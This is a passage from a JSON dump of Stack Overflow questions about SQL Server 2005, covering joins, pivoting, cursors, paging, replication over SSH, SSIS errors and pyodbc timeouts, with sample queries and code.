id, a name an 15 property names. The other refers to the id from table 1 and a property number and contains the value to each property for different items.<br>\nSo table 1:  </p>\n\n<pre><code>tab1_id | item_type | property_name_1| ... |property_name_15\n</code></pre>\n\n<p>table 2:</p>\n\n<pre><code>item_id | tab1_id | property_nr | value\n</code></pre>\n\n<p>I would like to create a view containing the properties for a specified item_type as colums:</p>\n\n<p>view:  </p>\n\n<pre><code>item_id |property_name_1 | ... | property_name_X \n...     |  value_1       | ... | value_x\n</code></pre>\n\n<p>And now to the additional problem:\nThere can be multiple entries in table 1 per item_type because there can be more than 15 properties per item type.<br>\nOf course there can also be less than 15 properties per item_type.</p>\n\n<p>Based on the item type one would have to find out which property numbers are used, extract their names from table 1 and then fill the view with the values of that property number from table 2.</p>\n\n<p>I know this could be easily done by writing an external tool but the preferred method would be to do this on the server in sql.</p>\n\n<p>So two questions: Is that even possible to create something like that as a view or stored procedure in mssql? </p>\n\n<p>And if yes could you point me to a way of doing this?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","synchronization"],"answer_count":6,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":1171,"score":4,"question_id":1085783,"title":"SQL Server 2005 - Syncing development/production databases","body":"<p>I've got a rather large SQL Server 2005 database that is under constant development. Every so often, I either get a new developer or need to deploy wide-scale schema changes to the production server.</p>\n\n<p>My main concern is deploying schema + data updates to developer machines from the \"master\" development copy.</p>\n\n<p>Is there some built-in functionality or tools for publishing schema + data in such a fashion? I'd like it to take as little time as possible. Can it be done from within SSMS?</p>\n\n<p>Thanks in advance for your time</p>\n"},{"tags":["sql","sql-server-2005","triggers","timeout"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12971347,"title":"Program started from trigger times out a db-access","body":"<p>I call a programm from a trigger </p>\n\n<pre><code>SET @exeCall = 'C:\\...\\XMLResultValueSplitter.exe '+CAST(@resultID as nvarchar(40))\nEXEC master.dbo.xp_cmdshell @exeCall\n</code></pre>\n\n<p>The Programm reads the new, inserted line (by the resultId), splitts up several xmlvalues of it and inserts some values to another table.\nBut when executing it by the tirgger i get a timeout (starting it <em>normal</em>, it works of course)</p>\n\n<p>Do you knwo how to handle this problem?</p>\n\n<p>Thank you, Karl</p>\n"},{"tags":["sql","sql-server-2005","join"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":48,"score":2,"question_id":12969058,"title":"join if entry doesn't exists in second table","body":"<p>I have two tables which are selected an joined,</p>\n\n<p>Table1</p>\n\n<pre><code>PK    Val1    Val2     FK\n1     a       b        10\n2     c       d        11\n3     e       f\n4     g       h        12\n</code></pre>\n\n<p>Table2</p>\n\n<pre><code>PK    Val3\n10     X\n11     Y\n12     Z\n</code></pre>\n\n<p>When I do a select on this both tables with an inner join and all the Val-Columns I get this result:</p>\n\n<pre><code>Result\nPK    Val1    Val2     Val3\n1     a       b        X\n2     c       d        Y\n4     g       h        Z\n</code></pre>\n\n<p>As you can see the third entry is missing.\nWhat I want is something like this:</p>\n\n<pre><code>Result\nPK    Val1    Val2     Val3\n1     a       b        X\n2     c       d        Y\n3     e       f\n4     g       h        Z\n</code></pre>\n\n<p>How do I have to modify the joinquery</p>\n\n<pre><code>SELECT ... FROM Table1 INNER JOIN Table2 On Table1.FK = Table2.PK\n</code></pre>\n\n<p>Thank you, Karl</p>\n"},{"tags":["sql","sql-server","sql-server-2005","join","temporary-tables"],"answer_count":4,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":1221,"score":3,"question_id":1326608,"title":"Speeding up temp table joins in SQL Server","body":"<p>I have 2 temp tables #temp1 and #temp. Both have a key and date columns. Both have around 25k rows. And I'm left joining them on the basis of the key and date which are unique on all rows. It's taking around 4 minutes for this join to complete. Is there any way to speed it up or any alternative methods?</p>\n"},{"tags":["sql-server-2005","declarative"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":12966405,"title":"Output from multiple identity inserts into another table","body":"<p>I'm trying to take the data from multiple tables and import them into other tables. The destination use identity id's and the source tables have different id's. I need to get the new identity id's from the inserts and add them to another table in the destination DB. Here is what I have so far but not sure how to get it to work. I tried adding the TMMYId to the OUTPUT but that isn't working.</p>\n\n<pre><code>DECLARE @MakeModels TABLE (MakeId int, ModelId int, YearId int, TMMYId int)\n\nINSERT INTO @MakeModels (MakeId, ModelId, YearId, TMMYId)\nSELECT MakeID, ModelID, YearID, T.id TypeMakeModelYear T \nJOIN Fitment F \nON F.TMMYID = T.id JOIN PartToAppCombo P ON F.PartToAppComboID = P.ID\nWHERE P.PartmasterID IN (SELECT PP.PartMasterID FROM PartPriceInv PP WHERE Discontinued   \n= 0)\n\nDECLARE @MakeOutput TABLE (MakeId int, TMMYId int)\nDECLARE @ModelOutput TABLE (ModelId int, TMMYId int)\nDECLARE @YearOutput TABLE (YearId int, TMMYId int)\n\nINSERT INTO Class1 (Name, Active) \nOUTPUT INSERTED.Class1Id, MM.TMMYId INTO @MakeOutput\nSELECT M.Description, 1 FROM Makes M JOIN @MakeModels MM ON M.id = MM.MakeId\nWHERE NOT EXISTS (SELECT Class1Id FROM Class1 WHERE Name = M.Description )\n\nINSERT INTO Class2 (Name, Active) \nOUTPUT INSERTED.Class2Id, MM.TMMYId INTO @ModelOutput\nSELECT M.Description, 1 FROM Models M JOIN @MakeModels MM ON M.id = MM.ModelId\nWHERE NOT EXISTS (SELECT Class2Id FROM Class2 WHERE Name = M.Description)\n\nINSERT INTO Class3 (Name, Active) \nOUTPUT INSERTED.Class3Id, MM.TMMYId INTO @YearOutput\nSELECT M.Description, 1 FROM Years M JOIN @MakeModels MM ON M.id = MM.YearId\nWHERE NOT EXISTS (SELECT Class3Id FROM Class3 WHERE Name = M.Description)\n\nINSERT INTO MMY (class1Id, class2Id, class3Id) \nSELECT M.MakeId, MO.ModelId, Y.YearId FROM @MakeOutput M JOIN @ModelOutput MO ON    \nM.TMMYId = MO.TMMYId\nJOIN @YearOutput Y ON MO.TMMYId = Y.TMMYId\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":4,"favorite_count":10,"up_vote_count":15,"down_vote_count":0,"view_count":1653,"score":15,"question_id":1038506,"title":"Efficient way of getting @@rowcount from a query using row_number","body":"<p>I have an expensive query using the row_number over() functionality in SQL Server 2005.  I return only a sub list of those records as the query is paginated.  However, I would like to also return the total number of records, not just the paginated subset.  Running the query effectively twice to get the count is out of the question.</p>\n\n<p>Selecting count(*) is also out of the question as the performance is absolutely terrible when I've tried this.</p>\n\n<p>What I'd really love is @@ROW_NUMBERROWCOUNT :-)</p>\n"},{"tags":["sql-server","tsql","sql-server-2005","declarative"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12965114,"title":"How can I do this without a cursor or loop?","body":"<p>I hear to use Declarative programming but I have no idea how to do something like this in sql server 2005\n(I typed this up really fast so I'm not sure if all the syntax is correct but I think you'll understand what I'm looking for)</p>\n\n<pre><code>declare curs cursor for\nselect @Name, @Description, @Id FROM TableA\nopen curs\nwhile(1=1) \nbegin\n    fetch next from curs into\n        @Name,\n        @Description,\n        @Id\n    if(@@fetch_status&lt;&gt;0) break\n\n    set @recordCount = (SELECT COUNT(*) As RecordCount FROM Class1 WHERE          \n            Class1Id = @Id)\n    if(@recordCount &gt; 0)\n    begin\n\n        if(@Name = 'BAD NAME') CONTINUE\n        UPDATE Class1 SET \n            Name = @Name\n            , Description = @Description\n            WHERE Class1Id = @Id\n    end\n    else\n    begin\n        INSERT INTO Class1 (Class1Id, Name, Description)\n        VALUES (@Id, @Name, @Description)\n    end\n\nend\nclose curs\ndeallocate curs\n</code></pre>\n"},{"tags":["sql-server-2005","ssh","replication","vpn","tunnel"],"answer_count":2,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":1027,"score":1,"question_id":236242,"title":"Can I do SQL Server 2005 merge replication through an SSH tunnel?","body":"<p>Our usage case is a database responsible for accounts, sessions, licenses, etc. — it needs to be polled upon client startup, so high reliability is crucial. As such, we'd like to replicate across different servers in physically separate networks, just in case an entire datacenter happens to go down. I have successfully set up a push subscription to another server in the same network, so this generally works. It's the connection to servers <em>outside</em> the network that I need to get working now.</p>\n\n<p>Replication doesn't work directly across networks. Microsoft <a href=\"http://msdn.microsoft.com/en-us/library/ms151319(SQL.90).aspx\" rel=\"nofollow\">suggests either a VPN or web replication</a>. The latter strikes me as inefficient (and they do say \"Note: Web synchronization is designed for synchronizing data with portable computers, handheld devices, and other clients. Web synchronization is not intended for high-volume server-to-server applications.\")</p>\n\n<p>The former, a VPN, would work, but I still consider it a needlessly complex solution (not to mention the added potential for security issues) to continuously run a VPN connection. <strong>I'd much rather just run an SSH tunnel.</strong> Yet, I can't find any article that explains how to do this and isn't about MySQL.</p>\n\n<p>I've got an SSH server set up on the subscriber, and have used PuTTY to establish a tunnel from <code>&lt;publisher&gt;:1434</code> to <code>&lt;subscriber&gt;:1433</code>. I cannot, however, get SQL Server Management Studio to connect this way (I'm not sure it supports the <code>:</code> port syntax). I've also set up an alias on <code>&lt;publisher&gt;</code>'s SQL Server Configuration Manager, with <code>@@servername</code> of <code>&lt;subscriber&gt;</code>, pointing to <code>localhost:1434</code>. Connecting to that doesn't appear to work either.</p>\n\n<p>I used the push subscription option, so I figure the publisher needs to connect to the subscriber, not the other way 'round.</p>\n\n<p>Both servers use the default instance, and run SQL Server 2005 SP 2 on Windows Server 2003 SP 2. The SSH server on the subscriber is freeSSHd 1.2.1.</p>\n\n<p>Is this possible at all? Is there another way I can leverage SSH to pretend the machine exists within the same network? Or do I have to go with a VPN?</p>\n"},{"tags":["python","sql-server-2005","pyodbc"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":12945353,"title":"pyodbc.connect timeout argument is ignored for calls to SQL Server","body":"<p>I am using pyodbc on Linux with FreeTDS to connect to SQL Server 2005. I have noticed that the timeout argument to my connection is not being honoured by my queries.</p>\n\n<p>When I run the following I would expect to see timeout errors after both cursor.execute calls.</p>\n\n<pre><code>import pyodbc\nimport time\n\nconnString = 'SERVER=dbserver;PORT=1433;DATABASE=db;UID=dbuser;PWD=dbpwd;' + \\\n    'DRIVER=FreeTDS'\ncnxn = pyodbc.connect(connString , timeout=3)\n\ncursor = cnxn.cursor()\n\nt1  = time.time()\ncursor.execute(\"SELECT MAX(Qty) FROM big_table WHERE ID&lt;10000005\")\nprint cursor.fetchone()\nt2 = time.time()\nprint t2-t1\n\ncursor.execute(\"WAITFOR DELAY '00:00:30'\")\nprint 'OK'\n</code></pre>\n\n<p>Instead I get this output. Indicating that the first db query is taking over 7.5 seconds and the second call is taking 30 seconds without throwing a timeout.</p>\n\n<pre><code>(808432.0, )\n7.56196093559\nOK\n</code></pre>\n\n<p>Is there a better way to force a query timeout using pyodbc and SQL Server?</p>\n"},{"tags":["sql-server-2008","sql-server-2005","c#-4.0","dll",".net-assembly"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":102,"score":5,"question_id":12130591,"title":"Support multiple assemblies on ASP.NET\\C# projects","body":"<p>We're developing a ASP.NET application and having some problems with integration with a MS dll (Microsoft.AnalysisServices)?</p>\n\n<p>The original project was linked to the dll which came with SQLServer2005 (Version=9.0.242.0). After migrating to SQLServer2008R2 (version=10.0.0.0) we encountered this problem: </p>\n\n<blockquote>\n  <p>Could not load file or assembly 'Microsoft.AnalysisServices,\n  Version=9.0.242.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91'\n  or one of its dependencies. The system cannot find the file\n  specified.</p>\n</blockquote>\n\n<p>This is understood since we compile the project with one version and then another version is located on the server. After installing SQLServer2008R2 on the development machine the problem was fixed. </p>\n\n<p>However we now have another problem that we need to support both SQLServer2005 and SQLServer2008R2 environments. I know that we can redirect the search path for the dll using a config file (that it will search for a different version that what it was compiled with), but I can't seem to find instructions how to use it for Web Application (on w3wp). We tried to use \"Specific Version\"=false, but since this is a \"Strong Name\" assembly it doesn't work as one would think.</p>\n\n<p>The relevant link which I found is this:<br>\n<a href=\"http://social.msdn.microsoft.com/Forums/en-US/sqlanalysisservices/thread/47d0b992-3c10-4851-b2a5-9f72d2c0976e\" rel=\"nofollow\">http://social.msdn.microsoft.com/Forums/en-US/sqlanalysisservices/thread/47d0b992-3c10-4851-b2a5-9f72d2c0976e</a></p>\n\n<p>Can someone please direct me to a link for solving this issue?</p>\n\n<p>Update: I guess I didn't test it correctly since it doesn't work for other servers in SQLServer2008 R2. I guess you can't use range in the newVersion element. So the question is still opened for everyone! . Bottom line is that I know that I have version 9.0.242.0 but the customers version may be either 9.0.242.0 or 10.0.0.0. Is there a method which I can dynamically choose the correct assembly on the production server</p>\n"},{"tags":["tsql","sql-server-2005","distinct","max"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":53,"score":2,"question_id":12962473,"title":"How do I display all columns from a table while using SELECT DISTINCT & MAX(ID) to remove duplicates?","body":"<p>I have a table that, in some instances, has more than one entry for the same employee.</p>\n\n<p>I only want the employee record with the highest ID.</p>\n\n<p>Example of table structure &amp; data</p>\n\n<pre><code>ID  FirstName   LastName    Initials    AreaID  SupervisorID    Forms   JobClass    JobTitle\n----------------------------------------------------------------------------------------    \n805/    Trey/   W/  TW/ 93/ 404/    99/NA/  Temporary/ R1_Temp\n752/    Trey/   W/  TW/ 93/ 404/    99/NA/  Temporary/ R1_Temp \n399/    Ron/    V/  RV/ 144/    NULL/   99/NULL/    NULL/   NULL\n374/    Ron/    V/  RV/ 94/ NULL/   99/NULL/    NULL/   NULL\n379/    Ron/    V/  NULL/   0/  NULL/   99/NULL/    NULL/   NULL\n378/    Dax/    T/  NULL/   0/  NULL/   40/NULL/    NULL/   NULL\n373/    Dax/    T/  DT/ 94/ NULL/   40/NULL/    NULL/   NULL\n398/    Dax/    T/  DT/ 94/ 276/    99/NULL/    NULL/   NULL\n</code></pre>\n\n<p>As you can see, there are three entries for Ron V.  </p>\n\n<p>There are currently ~1000 entries (including duplicates).  The query below returns ~700 (excluding duplicates), which is correct.</p>\n\n<pre><code>SELECT DISTINCT LastName, MAX(ID) as ID\nFROM Employees GROUP BY LastName \norder by LastName DESC\n</code></pre>\n\n<p>This only returns the ID and LastName.  We need to return all the values in the table above.  How do I do it in a single query?</p>\n\n<p>Thank you!</p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":12961875,"title":"Command(s) completed succesfully returned when result expected","body":"<p>The stored procedure I created initially worked, but the requirement changed. The requirement is now basically that the results should be like:</p>\n\n<pre><code>item | totalproperty1 | percentofproperty1 | totalproperty2 | ...\n</code></pre>\n\n<p>In doing this, we need the calculation of the total to be in the denominator of the percentage calculation (to prevent having to recalculate the total again for the percentage). To try and do this, I attempted this:</p>\n\n<pre><code>Declare @Item varchar(50)\nDeclare @TotalProperty1 decimal (9,2)\nDeclare @PercentProperty1 decimal (9,2)\nDeclare @TotalProperty2 decimal (9,2)\n...\n</code></pre>\n\n<p>the ... is just more declares of total and percent items, same data types throughout (it's an ugly mess, I apologize)</p>\n\n<pre><code>select @Item = item,\n       @TotalProperty1 = (--long query to get the total\n                          ),\n       @PercentProperty1 = (--long query to get the items compared\n                             / @TotalProperty1),\n       ...\n\nfrom table1 join table2 on table1.table2ID = table2.ID\nwhere -- condition\n</code></pre>\n\n<p>The ... in this section is repeats of the Total/Percent calculations, just for different properties.</p>\n\n<p>I've deleted the closing parentheses on each of the subqueries and readded them to verify they match the opening ones of the subqueries. Before, the calculation was basically a total of all the properties matches vs. the total number of items, but the requirement made it more granular.</p>\n\n<p>When I attempt to execute the alter script, it says \"Command(s) completed successfully.\" which is great, but when I attempt to execute the stored procedure, it, too, returns \"Command(s) completed successfully.\" which is not the expected result (I think the \"select @item... conditions\" section should still return the select statement, correct?).</p>\n\n<p>The main change from the previous working one vs. the current one is that before, I wasn't doing the select variable = query, variable2 = query, etc. but rather a typical select statement. If I had to guess, that'd be the issue, but I was using <a href=\"http://www.sql-server-helper.com/error-messages/msg-141.aspx\" rel=\"nofollow\">this as a guide</a> in relation to the Msg 141 I was receiving midway through.</p>\n"},{"tags":["sql-server-2005","reporting-services","bids"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":29,"score":2,"question_id":12961861,"title":"Is there a way to make user sort results stay on an SSRS 2005 report refresh","body":"<p>I'm relatively new to the SQLServer world and I'm trying to learn SSRS 2005 for the company I'm working with, so forgive me if I have missed any obvious answers in my research.</p>\n\n<p>The problem I'm having is that I have a report which allows users to sort the main table by columns, only when the report is refreshed by the reporting server, the user sort is reset. This is causing a lot of complaints by the users on the floor who are working with this report for most of their daily tasks.</p>\n\n<p>The report is basically one table which is returning multiple results based on the parameters given and the data returned by the Stored procedure. The sort functionality is achieved by setting the user sort on the table header for each column. </p>\n\n<p>Any help would be appreciated.</p>\n"},{"tags":["sql","sql-server-2008","sql-server-2005","data","sqlclient"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":96,"score":2,"question_id":12201943,"title":"SqlDbType.Date SQL Server 2005","body":"<p>I have a property like this:</p>\n\n<pre><code>private SqlParameter DateOfBirthSqlParameter\n{\n    get\n    {\n        return new SqlParameter(\"@date\", SqlDbType.Date)\n            {\n                Value = dateOfBirth.ToString(\"MM/dd/yyyy\");\n            };\n    }\n}\n</code></pre>\n\n<p><code>dateOfBirth</code> is a <code>DataTime</code> C# type. I use this parameter to add to my SQL command, that look like this.</p>\n\n<pre><code>Select * From mytable Where dob_dt = @date\n</code></pre>\n\n<p>The problem is that doesn't work in SQL Server 2005. I got an exception: </p>\n\n<blockquote>\n  <p><em>System.ArgumentException: The version of SQL Server in use does not\n  support datatype 'date'</em></p>\n</blockquote>\n\n<p>This because SQL Server 2005 doesn't support <code>Date</code>, this is a feature of later version (SQL Server <strong>2008</strong>). </p>\n\n<p>There are many solutions to this, for instance change <code>SqlDbType.Date</code> to <code>SqlDbType.DateTime</code></p>\n\n<p>I guess the reference <code>System.Data</code> is a version that provide all features supported for SQL Server 2008. Should I change it to something that only support 2005? that will help to discover other possible mismatches? What is the best way to handle this situation?</p>\n\n<p>Thanks.</p>\n\n<p><strong>Update: 8/31/2012</strong></p>\n\n<p>In the example, I used date of birth but In my application I used something else such as purchase_dt or something like it (with the time on it). My first Select Statement was:</p>\n\n<pre><code>Select * From mytable Where Cast(purchase_dt as Date) = @date\n</code></pre>\n\n<p>and that was fine in my computer with SQL Server <strong>2008</strong> and in another PC with SQL Server <strong>2005</strong> also was fine and just throws an exception when it got to the select. </p>\n\n<p>But, once I fixed that, with:</p>\n\n<pre><code>Select * From mytable Where Cast(DATEDIFF(dd, 0, purchase_dt) as DateTime) = @date\n</code></pre>\n\n<p>This broke the entire web application (in the other PC)... The problem was <code>SqlDbType.Date</code>. but Why it didn't break it before?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","sql-server-2008-r2"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":28,"score":-2,"question_id":12961115,"title":"TVF doesn't give any data","body":"<p>I have one table valued function. It gives no data when executed. But when I execute only the query of that table valued function by giving the same parameter, then I get the data. Why is this?</p>\n\n<p>I am executing TVF as follows:</p>\n\n<pre><code>select *\n  from fn_name(param1,param2,param3)\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12959713,"title":"SQL Server 2005 alter multiple indexes on single database","body":"<p>On production database in my environment, there are over 2000+ indexes that need to be maintained. There are particular high traffic indexes that become fragmented within the week. </p>\n\n<p>For nightly maintenance jobs can concurrent alter index statement be ran on multiple tables within the same database? </p>\n\n<p>I would like to know the pros and cons of this setup.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":59,"score":0,"question_id":12959435,"title":"Cannot be divided by zero in SQL Error","body":"<p>I am wondering if there is a way to not use the division if the divisor = 0. In this case, i have the query working fine except when it has to be divided by 0. It should give the answer as 0 if the divisor is 0.Is it possible? This is in SQl 2005.</p>\n\n<p>Thanks!</p>\n\n<pre><code>Select sum(cast(isnull(S.AmountSold, 0) as numeric(10,2))) As DeliveryTotal,\nsum(cast(isnull(S.S_AmountCollected, 0) as numeric(10,2))) as DeliveryTotalCollected\n(sum(cast(isnull(S.S_AmountCollected, 0) as numeric(10,2))) / sum(cast(isnull(S.AmountSold, 0) as numeric(10,2))) )*100 as DeliveryTotalPercentageCollected\n\nfrom Info RD\n</code></pre>\n"},{"tags":["java","sql-server-2005","mybatis"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":55,"score":-1,"question_id":12958597,"title":"100% memory usage on sql server and 100% cpu usage un java batch application for stored procedure","body":"<p>we have a batch java program based on mybatis for data access , running on server 1, which purpose is to print some informations returned by a stored procedure of sql server 2005 running on server 2. We have found that stored procedure uses nearly the 100% memory of server 2, this is due to a bad implmentation of the procedure which contains a lot of nested cursors and we are triyng to change and optimize it. The weird problem is the java application which uses 100% cpu when started. Could it be connected to the above procedure ? after the sp has returned it's values a file gets filled with them. What would happen if the file gets opened before the call of to the procedure , i mean could it be involved in  the high cpu using ? Anyway anybody could provide us any good hint about what to investigate ?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12958072,"title":"Get Sum of all Distinct in a week","body":"<p>I am wondering where exactly i am not clear with this query. I want to get the count of all distinct RepIDs that worked in a particular week. This is In SQL Server 2005. Thank you!!</p>\n\n<p>This query gives me distinct RepID's for the whole week. I want to count RepID twice if he has records on 2 different days but count only once even if he has more than 1 record for any partiular day.. I hope i am clear. I am sorry that i was not clear before! Thank you!</p>\n\n<pre><code>Select count(distinct(RepID)) as SalesPeople from DailyInfo\nwhere Date &gt; DATEADD(dd, -(DATEPART(dw, @Date)-1), @Date) \n     and Date &lt; DATEADD(dd, 7-(DATEPART(dw, @Date)), @Date)\n</code></pre>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","sql-job"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":119,"score":2,"question_id":11986611,"title":"What do the Categories in SQL Server Agent Jobs mean?","body":"<p>This is the first time I am trying for the <strong>SQL Job Agent</strong>...I was <strong>trying to create the sample job</strong> and I got struck in between when it came to select the <strong>Category as highlighted</strong> in the below screen shot</p>\n\n<p><img src=\"http://i.stack.imgur.com/nTYYg.png\" alt=\"enter image description here\"></p>\n\n<p>I am new to <strong>SQL Server</strong> can you explain the meanings of categories as mentioned above? or any link will be hightly appreciated.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":5,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":3373,"score":4,"question_id":428458,"title":"Counting rows for all tables at once","body":"<p>I'm using SQL Server 2005 and would like to know how I can get a list of all tables with the number of records in each.</p>\n\n<p>I know I can get a list of tables using the <code>sys.tables</code> view, but I'm unable to find the count.</p>\n\n<p>Thank you</p>\n"},{"tags":["sql-server","sql-server-2005","ssis","ibm-midrange","bids"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":94,"score":2,"question_id":12935483,"title":"SSIS: Just started getting a \"Key not valid for use in specified state.\" error on my sheduled SSIS package","body":"<p>I have 2 scheduled jobs on my SQL Server 2005 machine that are scheduled to run each morning (around 2:00 AM).  These jobs have worked fine (mostly) for years and although I've had a few hiccups that I've had to work through this problem is completely stumping me.</p>\n\n<p>Two mornings ago, one of my packages started reporting the following error:</p>\n\n<pre><code>Executed as user: [Service Acount]. ...n 9.00.4035.00 for 32-bit\nCopyright (C) Microsoft Corp 1984-2005. All rights reserved.\n     Started:  1:15:01 AM  Error: 2012-10-17 01:15:03.98\n     Code: 0xC0016016\n     Source:\n       Description: Failed to decrypt protected XML node \"DTS:Password\" \n       with error 0x8009000B \"Key not valid for use in specified state.\". \n       You may not be authorized to access this information. This error \n       occurs when there is a cryptographic error. Verify that the \n       correct key is available.  End Error  Error: 2012-10-17 01:15:03.99\n     Code: 0xC0016016\n     Source:\n       Description: Failed to decrypt protected XML node \"DTS:Password\" \n       with error 0x8009000B \"Key not valid for use in specified state.\". \n       You may not be authorized to access this information. This error \n       occurs when there is a cryptographic error. Verify that the \n       correct key is available.  End Error  Error: 2012-10-17 01:15:04.01\n     Code: 0xC0016016     \nSource:       \nDescription: Failed to ...  The package execution fa...  The step failed.\n</code></pre>\n\n<p>This appears to be a common problem, however, none of the recommendations that I've found either apply to my scenario nor does my instance seem to match most of the other cases where this occurs.  Here are the important details regarding my implementation.</p>\n\n<ul>\n<li>This package is exporting data from an iSeries system, to SQL Server\n2005 data tables. </li>\n<li>This process works successfully but keeps crashing\non one, specific table export.  In fact, it runs without any trouble\nfor over 2 hours before it dies.  After inspecting all properties associated\nwith this step, I can see that there is nothing different about this step \ncompared to the other table export steps, other than the table/column export \nmappings.</li>\n<li>The package <code>ProtectionLevel</code> is set to <code>DontSaveSensitive</code> and the iSeries \ncredentials are stored in a config file that is accessed by SQL Server. </li>\n<li>I can execute the failing step on my machine, in BIDS. Regardless, it doesn't \nwork on the server, though the server is using the exact same credentials.</li>\n<li>As I mentioned, I have two packages.  They are effectively the same thing, except \none is exporting the data from one iSeries database, and the other is exporting \ndata that is almost the exact same structure from another iSeries DB.  The first \npackage doesn't have any trouble even though it is using the same iSeries credentials.</li>\n<li>To be clear, nothing on my server has changed in months (that I am aware of.)  This \njust started happening yesterday morning.</li>\n</ul>\n\n<p>Any tips, or thoughts would be tremendously helpful.  This export is extremely important and many users/worker rely on this data for their day-to-day work.  Thank you.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","highcharts"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":97,"score":2,"question_id":12954824,"title":"Sql query to populate 0's for missing data","body":"<p>To populate a stacked and grouped highchart I need to add some 0 values into my data. I've tried with a numbers table but could not figure out how to add 0's for every empoloyee missing per date. So I have:</p>\n\n<p>TABLE (Datum, Employee, Number, Stack)</p>\n\n<pre><code>2012-10-13 00:00:00.000 Nick    3   corporate\n2012-10-14 00:00:00.000 Jack    1   private\n2012-10-15 00:00:00.000 Yannick 1   corporate\n2012-10-15 00:00:00.000 Jack    2   corporate\n</code></pre>\n\n<p>and I need:</p>\n\n<pre><code>2012-10-13 00:00:00.000 Nick    3   corporate\n2012-10-14 00:00:00.000 Nick    0   corporate\n2012-10-15 00:00:00.000 Nick    0   corporate\n2012-10-13 00:00:00.000 Jack    0   private\n2012-10-14 00:00:00.000 Jack    1   private\n2012-10-15 00:00:00.000 Jack    0   private\n2012-10-13 00:00:00.000 Yannick 0   corporate\n2012-10-14 00:00:00.000 Yannick 0   corporate\n2012-10-15 00:00:00.000 Yannick 1   corporate\n2012-10-13 00:00:00.000 Jack    0   corporate\n2012-10-14 00:00:00.000 Jack    0   corporate\n2012-10-15 00:00:00.000 Jack    2   corporate\n</code></pre>\n\n<p>do I need to use a cursor or is there a better trick?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","sql-server-2008-r2"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12954781,"title":"Refactoring T-SQL nested SELECT query to use in a case statement","body":"<p>I have the following table:</p>\n\n<pre><code>maker   model   type\nB   1121    pc\nA   1233    pc\nE   1260    pc\nA   1752    laptop\nA   1276    printer\nD   1288    printer\n</code></pre>\n\n<p>I need to receive a result in the form: maker, pc. If a particular maker has models in a given type, I need to concatenate the word 'yes' with the number of models in parentheses. Ex. yes(1) for maker 'A'. So, how can I avoid the following duplication?</p>\n\n<pre><code>CASE \nWHEN SELECT COUNT(*) WHERE ... &gt; 0\nTHEN 'yes(' + CAST((SELECT COUNT(*) WHERE ...) AS varchar) + ')'\n</code></pre>\n\n<p>This is not a real world problem. I just need to understand how to save a subquery result to use it in a branch statement. The result of this branch statement may contain the subquery result itself.</p>\n"},{"tags":["sql","sql-server-2005","paging"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12953197,"title":"sql query limit by amount of values in a column","body":"<p>I work on a SQL Server 2005, where I have two tables, like this:</p>\n\n<p><em>Table1</em></p>\n\n<pre><code>ID (Guid) Primarykey\nsomething1 (string)\nsomething2 (string)\n</code></pre>\n\n<p>And</p>\n\n<p><em>Table2</em></p>\n\n<pre><code>ID (Guid) Primarykey\nTable1ID (Guid) is a ForeignKey to Table1\nOrderNr (int)\nsomething1 (string)\nsomething2 (string)\n</code></pre>\n\n<p>Now I have to do a select query (which gives me hundreds of results), basically something like: <code>SELECT * from Table2 where something1 = 'foo' order by Table1ID, OrderNr</code></p>\n\n<p>Specially the order by is important, I can't change that. And the statement is in real much more complicated with a lot of joins, subselects and wheres and so on, but they are not needed here...</p>\n\n<p>My problem is, that I need a special paging: Just select all the rows with the 20 different Table1IDs starting from ID 10 to ID 15. (That means <strong>I want a paging, but not on rowcount but on this columns unique values</strong>)</p>\n\n<p>If I had a nested select or a function call which adds the iterated number of the selectstatement i could use a between, but how can I count the unique ids and add it to the query up there?</p>\n\n<p>Thank you for your help, Karl</p>\n"},{"tags":["sql-server-2005","subquery"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12951931,"title":"Fetch monthly records by total and by 